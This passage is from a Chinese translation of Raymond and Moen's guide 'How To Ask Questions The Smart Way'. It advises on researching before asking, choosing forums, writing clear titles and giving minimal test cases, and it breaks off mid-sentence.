[{"content":"如侵秒删\n提问的智慧 How To Ask Questions The Smart Way\nCopyright © 2001,2006,2014 Eric S. Raymond, Rick Moen\n本指南英文版版权为 Eric S. Raymond, Rick Moen 所有。\n原文网址：http://www.catb.org/~esr/faqs/smart-questions.html\nCopyleft 2001 by D.H.Grand(nOBODY/Ginux), 2010 by Gasolin, 2015 by Ryan Wu\n本中文指南是基于原文 3.10 版以及 2010 年由 Gasolin 所翻译版本的最新翻译；\n协助指出翻译问题，请发 issue，或直接发 pull request 给我。\n本文另有繁體中文版。\n原文版本历史 目录 声明 简介 在提问之前 当你提问时 慎选提问的论坛 Stack Overflow 网站和 IRC 论坛 第二步，使用项目邮件列表 使用有意义且描述明确的标题 使问题容易回复 使用清晰、正确、精准且合乎语法的语句 使用易于读取且标准的文件格式发送问题 精确地描述问题并言之有物 话不在多而在精 别动辄声称找到 Bug 低声下气不能代替你的功课 描述问题症状而非你的猜测 按发生时间先后列出问题症状 描述目标而不是过程 别要求使用私人电邮回复 清楚明确地表达你的问题以及需求 询问有关代码的问题时 别把自己家庭作业的问题贴上来 去掉无意义的提问句 即使你很急也不要在标题写紧急 礼多人不怪，而且有时还很有帮助 问题解决后，加个简短的补充说明 如何解读答案 RTFM 和 STFW：如何知道你已完全搞砸了 如果还是搞不懂 处理无礼的回应 如何避免扮演失败者 不该问的问题 好问题与蠢问题 如果得不到回答 如何更好地回答问题 相关资源 鸣谢 声明 许多项目在他们网站的帮助文档中链接了本指南。这很好，这正是我们想要的用途。但如果你是该项目管理员并试图创建指向本指南的超链接，请在超链接附近的显著位置注明：\n本指南不提供此项目的实际支持服务！\n我们已经深刻领教到缺少上述声明所带来的痛苦：我们将不停地被那些认为发布这本指南就意味着有责任解决世上所有技术问题的傻瓜苦苦纠缠。\n如果你因寻求某些帮助而阅读本指南，并在离开时还觉得可以从本文作者这里得到直接帮助，那你就是我们之前说的那些傻瓜之一。别问我们问题，我们只会忽略你。我们在这本指南中想教你如何从那些真正懂得你所遇到的软件或硬件问题的人处取得协助，而 99% 的情况下那不会是我们。除非你确定本指南的作者之一刚好是你所遇到的问题领域的专家，否则请不要打扰我们，这样大家都会开心一点。\n简介 在黑客的世界里，你所提技术问题的解答的好坏, 很大程度上取决于你提问的方式与此问题的难度。本指南将教你如何正确地提问以获得你满意的答案。\n现在开源（Open Source）软件已经相当盛行，您通常可以从其他更有经验的用户那里获得与黑客一样好的答案，这是件好事；和黑客相比，用户们往往对那些新手常遇到的问题更宽容一些。尽管如此，以我们在此推荐的方式对待这些有经验的用户通常也是从他们那里获得有用答案的最有效方式。\n首先你应该明白，黑客们喜爱有挑战性的问题，或者能激发他们思维的好问题。如果我们并非如此，那我们也不会成为你想询问的对象。如果你给了我们一个值得反复咀嚼玩味的好问题，我们自会对你感激不尽。好问题是激励，是厚礼。好问题可以提高我们的理解力，而且通常会暴露我们以前从没意识到或者思考过的问题。对黑客而言，“好问题！”是诚挚的大力称赞。\n尽管如此，黑客们有着蔑视或傲慢面对简单问题的坏名声，这有时让我们看起来对新手、无知者似乎较有敌意，但其实不是那样的。\n我们不讳言我们对那些不愿思考、或者在发问前不做他们该做的事的人的蔑视。那些人是时间杀手 —— 他们只想索取，从不付出，消耗我们可用在更有趣的问题或更值得回答的人身上的时间。我们称这样的人为 失败者（loser） （由于历史原因，我们有时把它拼作 lusers）。\n我们意识到许多人只是想使用我们写的软件，他们对学习技术细节没有兴趣。对大多数人而言，电脑只是种工具，是种达到目的的手段而已。他们有自己的生活并且有更要紧的事要做。我们认可这点，也从不指望每个人都对这些让我们着迷的技术问题感兴趣。尽管如此，我们只为那些真正有兴趣并愿意积极参与问题解决的人调整回答问题的风格。这点不会变，也不该变：否则，我们就是在最擅长的事情上降低效率。\n我们（在很大程度上）是自愿的，从繁忙的生活中抽出时间来解答疑惑，而且时常被提问淹没。所以我们无情地滤掉一些话题，特别是拋弃那些看起来像失败者的家伙，以便更高效地利用时间来回答赢家（winner）的问题。\n如果你厌恶我们的态度，高高在上，或过于傲慢，不妨也设身处地想想。我们并没有要求你向我们屈服 —— 事实上，我们大多数人非常乐意与你平等地交流，只要你付出小小努力来满足基本要求，我们就会欢迎你加入我们的文化。但让我们帮助那些不愿意帮助自己的人是没有效率的。无知没有关系，但装白痴就是不行。\n所以，你不必在技术上很在行才能吸引我们的注意，但你必须表现出能引导你变得在行的特质 —— 机敏、有想法、善于观察、乐于主动参与解决问题。如果你做不到这些使你与众不同的事情，我们建议你花点钱找家商业公司签个技术支持服务合同，而不是要求黑客个人无偿地帮助你。\n如果你决定向我们求助，当然你也不希望被视为失败者，更不愿成为失败者中的一员。能立刻得到快速并有效答案的最好方法，就是像赢家那样提问 —— 聪明、自信、有解决问题的思路，只是偶尔在特定的问题上需要获得一点帮助。\n（欢迎对本指南提出改进意见。你可以把你的建议发送至 esr@thyrsus.com 或 respond-auto@linuxmafia.com。然而请注意，本文并非网络礼节的通用指南，而我们通常会拒绝无助于在技术论坛得到有用答案的建议）。\n在提问之前 在你准备要通过电子邮件、新闻群组或者聊天室提出技术问题前，请先做到以下事情：\n尝试在你准备提问的论坛的旧文章中搜索答案。 尝试上网搜索以找到答案。 尝试阅读手册以找到答案。 尝试阅读常见问题文件（FAQ）以找到答案。 尝试自己检查或试验以找到答案。 向你身边的强者朋友打听以找到答案。 如果你是程序开发者，请尝试阅读源代码以找到答案。 当你提出问题的时候，请先表明你已经做了上述的努力；这将有助于树立你并不是一个不劳而获且浪费别人的时间的提问者。如果你能一并表达在做了上述努力的过程中所学到的东西会更好，因为我们更乐于回答那些表现出能从答案中学习的人的问题。\n运用某些策略，比如先用 Google 搜索你所遇到的各种错误信息（搜索 Google 论坛和网页），这样很可能直接就找到了能解决问题的文件或邮件列表线索。即使没有结果，在邮件列表或新闻组寻求帮助时加上一句 我在 Google 中搜过下列句子但没有找到什么有用的东西 也是件好事，即使它只是表明了搜索引擎不能提供哪些帮助。这么做（加上搜索过的字串）也让遇到相似问题的其他人能被搜索引擎引导到你的提问来。\n别着急，不要指望几秒钟的 Google 搜索就能解决一个复杂的问题。在向专家求助之前，再阅读一下常见问题文件（FAQ）、放轻松、坐得舒服一些，再花点时间思考一下这个问题。相信我们，他们能从你的提问看出你做了多少阅读与思考，如果你是有备而来，将更有可能得到解答。不要将所有问题一股脑拋出，只因你的第一次搜索没有找到答案（或者找到太多答案）。\n准备好你的问题，再将问题仔细地思考过一遍，因为草率的发问只能得到草率的回答，或者根本得不到任何答案。越是能表现出在寻求帮助前你为解决问题所付出的努力，你越有可能得到实质性的帮助。\n小心别问错了问题。如果你的问题基于错误的假设，某个普通黑客（J. Random Hacker）多半会一边在心里想着蠢问题…，一边用无意义的字面解释来答复你，希望着你会从问题的回答（而非你想得到的答案）中汲取教训。\n绝不要自以为够格得到答案，你没有；你并没有。毕竟你没有为这种服务支付任何报酬。你将会是自己去挣到一个答案，靠提出有内涵的、有趣的、有思维激励作用的问题 —— 一个有潜力能贡献社区经验的问题，而不仅仅是被动地从他人处索取知识。\n另一方面，表明你愿意在找答案的过程中做点什么是一个非常好的开端。谁能给点提示？、我的这个例子里缺了什么？以及我应该检查什么地方比请把我需要的确切的过程贴出来更容易得到答复。因为你表现出只要有人能指个正确方向，你就有完成它的能力和决心。\n当你提问时 慎选提问的论坛 小心选择你要提问的场合。如果你做了下述的事情，你很可能被忽略掉或者被看作失败者：\n在与主题不合的论坛上贴出你的问题。 在探讨进阶技术问题的论坛张贴非常初级的问题；反之亦然。 在太多的不同新闻群组上重复转贴同样的问题（cross-post）。 向既非熟人也没有义务解决你问题的人发送私人电邮。 黑客会剔除掉那些搞错场合的问题，以保护他们沟通的渠道不被无关的东西淹没。你不会想让这种事发生在自己身上的。\n因此，第一步是找到对的论坛。再说一次，Google 和其它搜索引擎还是你的朋友，用它们来找到与你遭遇到困难的软硬件问题最相关的网站。通常那儿都有常见问题（FAQ）、邮件列表及相关说明文件的链接。如果你的努力（包括阅读 FAQ）都没有结果，网站上也许还有报告 Bug（Bug-reporting）的流程或链接，如果是这样，链过去看看。\n向陌生的人或论坛发送邮件最可能是风险最大的事情。举例来说，别假设一个提供丰富内容的网页的作者会想充当你的免费顾问。不要对你的问题是否会受到欢迎做太乐观的估计 —— 如果你不确定，那就向别处发送，或者压根别发。\n在选择论坛、新闻群组或邮件列表时，别太相信它的名字，先看看 FAQ 或者许可书以弄清楚你的问题是否切题。发文前先翻翻已有的话题，这样可以让你感受一下那里的文化。事实上，事先在新闻组或邮件列表的历史记录中搜索与你问题相关的关键词是个极好的主意，也许这样就找到答案了。即使没有，也能帮助你归纳出更好的问题。\n别像机关枪似的一次“扫射”所有的帮助渠道，这就像大喊大叫一样会使人不快。要一个一个地来。\n搞清楚你的主题！最典型的错误之一是在某种致力于跨平台可移植的语言、套件或工具的论坛中提关于 Unix 或 Windows 操作系统程序界面的问题。如果你不明白为什么这是大错，最好在搞清楚这之间差异之前什么也别问。\n一般来说，在仔细挑选的公共论坛中提问，会比在私有论坛中提同样的问题更容易得到有用的回答。有几个理由可以支持这点，一是看潜在的回复者有多少，二是看观众有多少。黑客较愿意回答那些能帮助到许多人的问题。\n可以理解的是，老练的黑客和一些热门软件的作者正在接受过多的错发信息。就像那根最后压垮骆驼背的稻草一样，你的加入也有可能使情况走向极端 —— 已经好几次了，一些热门软件的作者由于涌入其私人邮箱的大量不堪忍受的无用邮件而不再提供支持。\nStack Overflow 搜索，然后在 Stack Exchange 问。\n近年来，Stack Exchange 社区已经成为回答技术及其他问题的主要渠道，尤其是那些开放源码的项目。\n因为 Google 索引是即时的，在看 Stack Exchange 之前先在 Google 搜索。有很高的几率某人已经问了一个类似的问题，而且 Stack Exchange 网站们往往会是搜索结果中最前面几个。如果你在 Google 上没有找到任何答案，你再到特定相关主题的网站去找。用标签（Tag）搜索能让你更缩小你的搜索结果。\n如果你还是找不到任何对你的问题有用的内容，请把你的问题发在与它最相关的网站上。提问的时候请善用格式化工具，尤其注意为代码添加格式，并且添加相关的标签（特别是编程语言、操作系统或库/包的名称）。当有人要求你提供更多相关信息时，请编辑你的贴子来补充它们[译注：而不是发一个回帖或回答！]。如果你觉得一个答案对你有帮助，点击向上的箭头来为它投票；如果一个答案提供了问题的正确解决方案，点击投票按钮下方的对勾来将它标记为正解。\nStack Exchange 已经成长到超过一百个网站，以下是最常用的几个站：\nSuper User 是问一些通用的电脑问题，如果你的问题跟代码或是写程序无关，只是一些网络连线之类的，请到这里。 Stack Overflow 是问写程序有关的问题。 Server Fault 是问服务器和网管相关的问题。 网站和 IRC 论坛 本地的用户群组（user group），或者你所用的 Linux 发行版本也许正在宣传他们的网页论坛或 IRC 频道，并提供新手帮助（在一些非英语国家，新手论坛很可能还是邮件列表），这些都是开始提问的好地方，特别是当你觉得遇到的也许只是相对简单或者很普通的问题时。有广告赞助的 IRC 频道是公开欢迎提问的地方，通常可以即时得到回应。\n事实上，如果程序出的问题只发生在特定 Linux 发行版提供的版本（这很常见），最好先去该发行版的论坛或邮件列表中提问，再到程序本身的论坛或邮件列表提问。（否则）该项目的黑客可能仅仅回复“使用我们的版本”。\n在任何论坛发文以前，先确认一下有没有搜索功能。如果有，就试着搜索一下问题的几个关键词，也许这会有帮助。如果在此之前你已做过通用的网页搜索（你也该这样做），还是再搜索一下论坛，搜索引擎有可能没来得及索引此论坛的全部内容。\n通过论坛或 IRC 频道来提供用户支持服务有增长的趋势，电子邮件则大多为项目开发者间的交流而保留。所以最好先在论坛或 IRC 中寻求与该项目相关的协助。\n在使用 IRC 的时候，首先最好不要发布很长的问题描述，有些人称之为频道洪水。最好通过一句话的问题描述来开始聊天。\n第二步，使用项目邮件列表 当某个项目提供开发者邮件列表时，要向列表而不是其中的个别成员提问，即使你确信他能最好地回答你的问题。查一查项目的文件和首页，找到项目的邮件列表并使用它。有几个很好的理由支持我们采用这种办法：\n任何好到需要向个别开发者提出的问题，也将对整个项目群组有益。反之，如果你认为自己的问题对整个项目群组来说太愚蠢，那这也不能成为骚扰个别开发者的理由。 向列表提问可以分散开发者的负担，个别开发者（尤其是项目领导人）也许太忙以至于没法回答你的问题。 大多数邮件列表都会被存档，那些被存档的内容将被搜索引擎索引。如果你向列表提问并得到解答，将来其他人可以通过网页搜索找到你的问题和答案，也就不用再次发问了。 如果某些问题经常被问到，开发者可以利用此信息来改进说明文件或软件本身，以使其更清楚。如果只是私下提问，就没有人能看到最常见问题的完整场景。 如果一个项目既有“用户”也有“开发者”（或“黑客”）邮件列表或论坛，而你又不会动到那些源代码，那么就向“用户”列表或论坛提问。不要假设自己会在开发者列表中受到欢迎，那些人多半会将你的提问视为干扰他们开发的噪音。\n然而，如果你确信你的问题很特别，而且在“用户”列表或论坛中几天都没有回复，可以试试前往“开发者”列表或论坛发问。建议你在张贴前最好先暗地里观察几天以了解那里的行事方式（事实上这是参与任何私有或半私有列表的好主意）\n如果你找不到一个项目的邮件列表，而只能查到项目维护者的电子邮件地址，尽管向他发信。即使是在这种情况下，也别假设（项目）邮件列表不存在。在你的电子邮件中，请陈述你已经试过但没有找到合适的邮件列表，也提及你不反对将自己的邮件转发给他人（许多人认为，即使没什么秘密，私人电子邮件也不应该被公开。通过允许将你的电子邮件转发他人，你给了相应人员处置你邮件的选择）。\n使用有意义且描述明确的标题 在邮件列表、新闻群组或论坛中，大约 50 字以内的标题是抓住资深专家注意力的好机会。别用喋喋不休的帮帮忙、跪求、急（更别说救命啊！！！！这样让人反感的话，用这种标题会被条件反射式地忽略）来浪费这个机会。不要妄想用你的痛苦程度来打动我们，而应该是在这点空间中使用极简单扼要的描述方式来提出问题。\n一个好标题范例是目标 —— 差异式的描述，许多技术支持组织就是这样做的。在目标部分指出是哪一个或哪一组东西有问题，在差异部分则描述与期望的行为不一致的地方。\n蠢问题：救命啊！我的笔记本电脑不能正常显示了！\n聪明问题：X.org 6.8.1 的鼠标指针会变形，某牌显卡 MV1005 芯片组。\n更聪明问题：X.org 6.8.1 的鼠标指针，在某牌显卡 MV1005 芯片组环境下 - 会变形。\n编写目标 —— 差异 式描述的过程有助于你组织对问题的细致思考。是什么被影响了？ 仅仅是鼠标指针或者还有其它图形？只在 X.org 的 X 版中出现？或只是出现在 6.8.1 版中？ 是针对某牌显卡芯片组？或者只是其中的 MV1005 型号？ 一个黑客只需瞄一眼就能够立即明白你的环境和你遇到的问题。\n总而言之，请想像一下你正在一个只显示标题的存档讨论串（Thread）索引中查寻。让你的标题更好地反映问题，可使下一个搜索类似问题的人能够关注这个讨论串，而不用再次提问相同的问题。\n如果你想在回复中提出问题，记得要修改内容标题，以表明你是在问一个问题， 一个看起来像 Re: 测试 或者 Re: 新 bug 的标题很难引起足够重视。另外，在不影响连贯性之下，适当引用并删减前文的内容，能给新来的读者留下线索。\n对于讨论串，不要直接点击回复来开始一个全新的讨论串，这将限制你的观众。因为有些邮件阅读程序，比如 mutt ，允许用户按讨论串排序并通过折叠讨论串来隐藏消息，这样做的人永远看不到你发的消息。\n仅仅改变标题还不够。mutt 和其它一些邮件阅读程序还会检查邮件标题以外的其它信息，以便为其指定讨论串。所以宁可发一个全新的邮件。\n在网页论坛上，好的提问方式稍有不同，因为讨论串与特定的信息紧密结合，并且通常在讨论串外就看不到里面的内容，故通过回复提问，而非改变标题是可接受的。不是所有论坛都允许在回复中出现分离的标题，而且这样做了基本上没有人会去看。不过，通过回复提问，这本身就是暧昧的做法，因为它们只会被正在查看该标题的人读到。所以，除非你只想在该讨论串当前活跃的人群中提问，不然还是另起炉灶比较好。\n使问题容易回复 以请将你的回复发送到……来结束你的问题多半会使你得不到回答。如果你觉得花几秒钟在邮件客户端设置一下回复地址都麻烦，我们也觉得花几秒钟思考你的问题更麻烦。如果你的邮件程序不支持这样做，换个好点的；如果是操作系统不支持这种邮件程序，也换个好点的。\n在论坛，要求通过电子邮件回复是非常无礼的，除非你认为回复的信息可能比较敏感（有人会为了某些未知的原因，只让你而不是整个论坛知道答案）。如果你只是想在有人回复讨论串时得到电子邮件提醒，可以要求网页论坛发送给你。几乎所有论坛都支持诸如追踪此讨论串、有回复时发送邮件提醒等功能。\n使用清晰、正确、精准且合乎语法的语句 我们从经验中发现，粗心的提问者通常也会粗心地写程序与思考（我敢打包票）。回答粗心大意者的问题很不值得，我们宁愿把时间耗在别处。\n正确的拼写、标点符号和大小写是很重要的。一般来说，如果你觉得这样做很麻烦，不想在乎这些，那我们也觉得麻烦，不想在乎你的提问。花点额外的精力斟酌一下字句，用不着太僵硬与正式 —— 事实上，黑客文化很看重能准确地使用非正式、俚语和幽默的语句。但它必须很准确，而且有迹象表明你是在思考和关注问题。\n正确地拼写、使用标点和大小写，不要将its混淆为it's，loose搞成lose或者将discrete弄成discreet。不要全部用大写，这会被视为无礼的大声嚷嚷（全部小写也好不到哪去，因为不易阅读。Alan Cox 也许可以这样做，但你不行）。\n更白话的说，如果你写得像是个半文盲[译注：小白]，那多半得不到理睬。也不要使用即时通信中的简写或火星文，如将的简化为d会使你看起来像一个为了少打几个键而省字的小白。更糟的是，如果像个小孩似地鬼画符那绝对是在找死，可以肯定没人会理你（或者最多是给你一大堆指责与挖苦）。\n如果在使用非母语的论坛提问，你可以犯点拼写和语法上的小错，但决不能在思考上马虎（没错，我们通常能弄清两者的分别）。同时，除非你知道回复者使用的语言，否则请使用英语书写。繁忙的黑客一般会直接删除用他们看不懂的语言写的消息。在网络上英语是通用语言，用英语书写可以将你的问题在尚未被阅读就被直接删除的可能性降到最低。\n如果英文是你的外语（Second language），提示潜在回复者你有潜在的语言困难是很好的： [译注：以下附上原文以供使用]\nEnglish is not my native language; please excuse typing errors.\n英文不是我的母语，请原谅我的错字或语法。 If you speak $LANGUAGE, please email/PM me; I may need assistance translating my question.\n如果你说某语言，请向我发电邮/私信； 我需要有人协助我翻译我的问题。 I am familiar with the technical terms, but some slang expressions and idioms are difficult for me.\n我对技术名词很熟悉，但对于俗语或是特别用法不甚了解。 I\u0026rsquo;ve posted my question in $LANGUAGE and English. I\u0026rsquo;ll be glad to translate responses, if you only use one or the other.\n我把我的问题用某语言和英文写出来。 如果你只用其中的一种语言回答，我会乐意将回复翻译成为你使用的语言。 使用易于读取且标准的文件格式发送问题 如果你人为地将问题搞得难以阅读，它多半会被忽略，人们更愿读易懂的问题，所以：\n使用纯文字而不是 HTML (关闭 HTML 并不难）。 使用 MIME 附件通常是可以的，前提是真正有内容（譬如附带的源代码或 patch），而不仅仅是邮件程序生成的模板（譬如只是信件内容的拷贝）。 不要发送一段文字只是一行句子但自动换行后会变成多行的邮件（这使得回复部分内容非常困难）。设想你的读者是在 80 个字符宽的终端机上阅读邮件，最好设置你的换行分割点小于 80 字。 但是，对一些特殊的文件不要设置固定宽度（譬如日志文件拷贝或会话记录）。数据应该原样包含，让回复者有信心他们看到的是和你看到的一样的东西。 在英语论坛中，不要使用Quoted-Printable MIME 编码发送消息。这种编码对于张贴非 ASCII 语言可能是必须的，但很多邮件程序并不支持这种编码。当它们处理换行时，那些文本中四处散布的=20符号既难看也分散注意力，甚至有可能破坏内容的语意。 绝对，永远不要指望黑客们阅读使用封闭格式编写的文档，像微软公司的 Word 或 Excel 文件等。大多数黑客对此的反应就像有人将还在冒热气的猪粪倒在你家门口时你的反应一样。即便他们能够处理，他们也很厌恶这么做。 如果你从使用 Windows 的电脑发送电子邮件，关闭微软愚蠢的智能引号功能 （从[选项] \u0026gt; [校订] \u0026gt; [自动校正选项]，勾选掉智能引号单选框），以免在你的邮件中到处散布垃圾字符。 在论坛，勿滥用表情符号和HTML功能（当它们提供时）。一两个表情符号通常没有问题，但花哨的彩色文本倾向于使人认为你是个无能之辈。过滥地使用表情符号、色彩和字体会使你看来像个傻笑的小姑娘。这通常不是个好主意，除非你只是对性而不是对答案感兴趣。 如果你使用图形用户界面的邮件程序（如微软公司的 Outlook 或者其它类似的），注意它们的默认设置不一定满足这些要求。大多数这类程序有基于选单的查看源代码命令，用它来检查发送文件夹中的邮件，以确保发送的是纯文本文件同时没有一些奇怪的字符。\n精确地描述问题并言之有物 仔细、清楚地描述你的问题或 Bug 的症状。 描述问题发生的环境（机器配置、操作系统、应用程序、以及相关的信息），提供经销商的发行版和版本号（如：Fedora Core 4、Slackware 9.1等）。 描述在提问前你是怎样去研究和理解这个问题的。 描述在提问前为确定问题而采取的诊断步骤。 描述最近做过什么可能相关的硬件或软件变更。 尽可能地提供一个可以重现这个问题的可控环境的方法。 尽量去揣测一个黑客会怎样反问你，在你提问之前预先将黑客们可能提出的问题回答一遍。\n以上几点中，当你报告的是你认为可能在代码中的问题时，给黑客一个可以重现你的问题的环境尤其重要。当你这么做时，你得到有效的回答的机会和速度都会大大的提升。\nSimon Tatham 写过一篇名为《如何有效地报告Bug》的出色文章。强力推荐你也读一读。\n话不在多而在精 你需要提供精确有内容的信息。这并不是要求你简单的把成堆的出错代码或者资料完全转录到你的提问中。如果你有庞大而复杂的测试样例能重现程序挂掉的情境，尽量将它剪裁得越小越好。\n这样做的用处至少有三点。 第一，表现出你为简化问题付出了努力，这可以使你得到回答的机会增加； 第二，简化问题使你更有可能得到有用的答案； 第三，在精炼你的 bug 报告的过程中，你很可能就自己找到了解决方法或权宜之计。\n别动辄声称找到 Bug 当你在使用软件中遇到问题，除非你非常、非常的有根据，不要动辄声称找到了 Bug。提示：除非你能提供解决问题的源代码补丁，或者提供回归测试来表明前一版本中行为不正确，否则你都多半不够完全确信。这同样适用在网页和文件，如果你（声称）发现了文件的Bug，你应该能提供相应位置的修正或替代文件。\n请记得，还有其他许多用户没遇到你发现的问题，否则你在阅读文件或搜索网页时就应该发现了（你在抱怨前已经做了这些，是吧？）。这也意味着很有可能是你弄错了而不是软件本身有问题。\n编写软件的人总是非常辛苦地使它尽可能完美。如果你声称找到了 Bug，也就是在质疑他们的能力，即使你是对的，也有可能会冒犯到其中某部分人。当你在标题中嚷嚷着有Bug时，这尤其严重。\n提问时，即使你私下非常确信已经发现一个真正的 Bug，最好写得像是你做错了什么。如果真的有 Bug，你会在回复中看到这点。这样做的话，如果真有 Bug，维护者就会向你道歉，这总比你惹恼别人然后欠别人一个道歉要好一点。\n低声下气不能代替你的功课 有些人明白他们不该粗鲁或傲慢的提问并要求得到答复，但他们选择另一个极端 —— 低声下气：我知道我只是个可悲的新手，一个失败者，但...。这既使人困扰，也没有用，尤其是伴随着与实际问题含糊不清的描述时更令人反感。\n别用原始灵长类动物的把戏来浪费你我的时间。取而代之的是，尽可能清楚地描述背景条件和你的问题情况。这比低声下气更好地定位了你的位置。\n有时网页论坛会设有专为新手提问的版面，如果你真的认为遇到了初学者的问题，到那去就是了，但一样别那么低声下气。\n描述问题症状而非你的猜测 告诉黑客们你认为问题是怎样造成的并没什么帮助。（如果你的推断如此有效，还用向别人求助吗？），因此要确信你原原本本告诉了他们问题的症状，而不是你的解释和理论；让黑客们来推测和诊断。如果你认为陈述自己的猜测很重要，清楚地说明这只是你的猜测，并描述为什么它们不起作用。\n蠢问题\n我在编译内核时接连遇到 SIG11 错误， 我怀疑某条飞线搭在主板的走线上了，这种情况应该怎样检查最好？\n聪明问题\n我的组装电脑是 FIC-PA2007 主机板搭载 AMD K6/233 CPU（威盛 Apollo VP2 芯片组）， 256MB Corsair PC133 SDRAM 内存，在编译内核时，从开机 20 分钟以后就频频产生 SIG11 错误， 但是在头 20 分钟内从没发生过相同的问题。重新启动也没有用，但是关机一晚上就又能工作 20 分钟。 所有内存都换过了，没有效果。相关部分的标准编译记录如下…\n由于以上这点似乎让许多人觉得难以配合，这里有句话可以提醒你：所有的诊断专家都来自密苏里州。 美国国务院的官方座右铭则是：让我看看（出自国会议员 Willard D. Vandiver 在 1899 年时的讲话：我来自一个出产玉米，棉花，牛蒡和民主党人的国家，滔滔雄辩既不能说服我，也不会让我满意。我来自密苏里州，你必须让我看看。） 针对诊断者而言，这并不是一种怀疑，而只是一种真实而有用的需求，以便让他们看到的是与你看到的原始证据尽可能一致的东西，而不是你的猜测与归纳的结论。所以，大方地展示给我们看吧！\n按发生时间先后列出问题症状 问题发生前的一系列操作，往往就是对找出问题最有帮助的线索。因此，你的说明里应该包含你的操作步骤，以及机器和软件的反应，直到问题发生。在命令行处理的情况下，提供一段操作记录（例如运行脚本工具所生成的），并引用相关的若干行（如 20 行）记录会非常有帮助。\n如果挂掉的程序有诊断选项（如 -v 的详述开关），试着选择这些能在记录中增加调试信息的选项。记住，多不等于好。试着选取适当的调试级别以便提供有用的信息而不是让读者淹没在垃圾中。\n如果你的说明很长（如超过四个段落），在开头简述问题，接下来再按时间顺序详述会有所帮助。这样黑客们在读你的记录时就知道该注意哪些内容了。\n描述目标而不是过程 如果你想弄清楚如何做某事（而不是报告一个 Bug），在开头就描述你的目标，然后才陈述重现你所卡住的特定步骤。\n经常寻求技术帮助的人在心中有个更高层次的目标，而他们在自以为能达到目标的特定道路上被卡住了，然后跑来问该怎么走，但没有意识到这条路本身就有问题。结果要费很大的劲才能搞定。\n蠢问题\n我怎样才能从某绘图程序的颜色选择器中取得十六进制的 RGB 值？\n聪明问题\n我正试着用替换一幅图片的色码（color table）成自己选定的色码，我现在知道的唯一方法是编辑每个色码区块（table slot）， 但却无法从某绘图程序的颜色选择器取得十六进制的 RGB 值。\n第二种提问法比较聪明，你可能得到像是建议采用另一个更合适的工具的回复。\n别要求使用私人电邮回复 黑客们认为问题的解决过程应该公开、透明，此过程中如果更有经验的人注意到不完整或者不当之处，最初的回复才能够、也应该被纠正。同时，作为提供帮助者可以得到一些奖励，奖励就是他的能力和学识被其他同行看到。\n当你要求私下回复时，这个过程和奖励都被中止。别这样做，让回复者来决定是否私下回答 —— 如果他真这么做了，通常是因为他认为问题编写太差或者太肤浅，以至于不可能使其他人产生兴趣。\n这条规则存在一条有限的例外，如果你确信提问可能会引来大量雷同的回复时，那么这个神奇的提问句会是向我发电邮，我将为论坛归纳这些回复。试着将邮件列表或新闻群组从洪水般的雷同回复中解救出来是非常有礼貌的 —— 但你必须信守诺言。\n清楚明确地表达你的问题以及需求 漫无边际的提问是近乎无休无止的时间黑洞。最有可能给你有用答案的人通常也正是最忙的人（他们忙是因为要亲自完成大部分工作）。这样的人对无节制的时间黑洞相当厌恶，所以他们也倾向于厌恶那些漫无边际的提问。\n如果你明确表述需要回答者做什么（如提供指点、发送一段代码、检查你的补丁、或是其他等等），就最有可能得到有用的答案。因为这会定出一个时间和精力的上限，便于回答者能集中精力来帮你。这么做很棒。\n要理解专家们所处的世界，请把专业技能想像为充裕的资源，而回复的时间则是稀缺的资源。你要求他们奉献的时间越少，你越有可能从真正专业而且很忙的专家那里得到解答。\n所以，界定一下你的问题，使专家花在辨识你的问题和回答所需要付出的时间减到最少，这技巧对你获得有用的答案相当有帮助 —— 但这技巧通常和简化问题有所区别。因此，问我想更好地理解 X，可否指点一下哪有好一点说明？通常比问你能解释一下 X 吗？更好。如果你的代码不能运作，通常请别人看看哪里有问题，比要求别人替你改正要明智得多。\n询问有关代码的问题时 如果没有提示别人应该从何入手，别要求他人帮你调试有问题的代码。张贴几百行的代码，然后说一声：它不能工作会让你完全被忽略。只贴几十行代码，然后说一句：在第七行以后，我期待它显示 \u0026lt;x\u0026gt;，但实际出现的是 \u0026lt;y\u0026gt;比较有可能让你得到回应。\n最有效描述程序问题的方法是提供最精简的 Bug 展示测试用例（bug-demonstrating test case）。什么是最精简的测试用例？那是问题的缩影；一小个程序片段能刚好展示出程序的异常行为，而不包含其他令人分散注意力的内容。怎么制作最精简的测试用例？如果你知道哪一行或哪一段代码会造成异常的行为，复制下来并加入足够重现这个状况的代码（例如，足以让这段代码能被编译/直译/被应用程序处理）。如果你无法将问题缩减到一个特定区块，就复制一份代码并移除不影响产生问题行为的部分。总之，测试用例越小越好（查看话不在多而在精一节）。\n一般而言，要得到一段相当精简的测试用例并不太容易，但永远先尝试这样做是一个好习惯。这种方式可以帮助你了解如何自行解决这个问题 —— 而且即使你的尝试不成功，黑客们也会看到你在尝试取得答案的过程中付出了努力，这可以让他们更愿意与你合作。\n如果你只是想让别人帮忙审查（Review）一下代码，在信的开头就要说出来，并且一定要提到你认为哪一部分特别需要关注以及为什么。\n别把自己家庭作业的问题贴上来 黑客们很擅长分辨哪些问题是家庭作业式的问题；因为我们中的大多数都曾自己解决这类问题。同样，这些问题得由你来搞定，你会从中学到东西。你可以要求给点提示，但别要求得到完整的解决方案。\n如果你怀疑自己碰到了一个家庭作业式的问题，但仍然无法解决，试试在用户群组，论坛或（最后一招）在项目的用户邮件列表或论坛中提问。尽管黑客们会看出来，但一些有经验的用户也许仍会给你一些提示。\n去掉无意义的提问句 避免用无意义的话结束提问，例如有人能帮我吗？或者这有答案吗？。\n首先：如果你对问题的描述不是很好，这样问更是画蛇添足。\n其次：由于这样问是画蛇添足，黑客们会很厌烦你 —— 而且通常会用逻辑上正确，但毫无意义的回答来表示他们的蔑视， 例如：没错，有人能帮你或者不，没答案。\n一般来说，避免用 是或否、对或错、有或没有类型的问句，除非你想得到是或否类型的回答。\n即使你很急也不要在标题写紧急 这是你的问题，不是我们的。宣称紧急极有可能事与愿违：大多数黑客会直接删除无礼和自私地企图即时引起关注的问题。更严重的是，紧急这个字（或是其他企图引起关注的标题）通常会被垃圾信过滤器过滤掉 —— 你希望能看到你问题的人可能永远也看不到。\n有半个例外的情况是，如果你是在一些很高调，会使黑客们兴奋的地方，也许值得这样去做。在这种情况下，如果你有时间压力，也很有礼貌地提到这点，人们也许会有兴趣回答快一点。\n当然，这风险很大，因为黑客们兴奋的点多半与你的不同。譬如从 NASA 国际空间站（International Space 